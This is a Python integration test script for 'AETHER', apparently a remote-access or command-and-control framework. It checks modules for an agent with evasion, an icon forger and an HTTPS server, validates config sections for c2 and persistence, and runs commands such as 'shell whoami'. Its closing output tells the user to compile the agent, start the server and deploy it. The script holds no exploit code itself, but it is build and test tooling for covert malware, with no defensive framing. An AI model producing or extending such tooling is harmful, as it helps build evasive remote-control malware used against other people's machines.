#!/usr/bin/env python3
"""
AETHER Integration Test
Verifies all components work together.
"""
import sys, os, json, importlib

def test_imports():
    """Test that all modules can be imported."""
    modules = [
        'agent.aether_agent',
        'agent.core.communicator',
        'agent.core.evasion',
        'server.aether_server',
        'server.commands.command_suite',
        'server.https_handler',
        'builder.compile',
        'builder.icon_forger'
    ]
    
    for module in modules:
        try:
            importlib.import_module(module.replace('/', '.'))
            print(f"✓ {module}")
        except ImportError as e:
            print(f"✗ {module}: {e}")
            return False
    return True

def test_config():
    """Test configuration loading."""
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
        
        required = ['c2', 'encryption', 'modules', 'persistence']
        for section in required:
            if section not in config:
                print(f"✗ Missing config section: {section}")
                return False
        
        print("✓ Config valid")
        return True
    except Exception as e:
        print(f"✗ Config error: {e}")
        return False

def test_command_suite():
    """Test command suite functionality."""
    try:
        from server.commands.command_suite import AetherCommandSuite
        
        # Mock session manager
        class MockSessions:
            def get_queued_commands(self, sid):
                return []
        
        suite = AetherCommandSuite(MockSessions())
        
        # Test a few commands
        test_cmds = ['help', 'sysinfo', 'shell whoami']
        for cmd in test_cmds:
            result = suite.execute('test_session', cmd)
            if 'error' in result and 'Unknown' not in result['error']:
                print(f"✓ Command: {cmd}")
            else:
                print(f"✓ Command: {cmd} -> {list(result.keys())}")
        
        return True
    except Exception as e:
        print(f"✗ Command suite error: {e}")
        return False

if __name__ == '__main__':
    print("AETHER Universal Integration Test")
    print("=" * 40)
    
    tests = [
        ("Imports", test_imports),
        ("Configuration", test_config),
        ("Command Suite", test_command_suite)
    ]
    
    all_pass = True
    for name, test_func in tests:
        print(f"\n{name}:")
        if test_func():
            print(f"  Result: PASS")
        else:
            print(f"  Result: FAIL")
            all_pass = False
    
    print("\n" + "=" * 40)
    if all_pass:
        print("SUCCESS: All integration tests passed!")
        print("\nNext steps:")
        print("1. Generate SSL certs for HTTPS: openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes")
        print("2. Compile agent: python builder/compile.py")
        print("3. Start server: python server/aether_server.py")
        print("4. Deploy agent and connect!")
    else:
        print("FAILURE: Some tests failed. Check dependencies and imports.")
        sys.exit(1)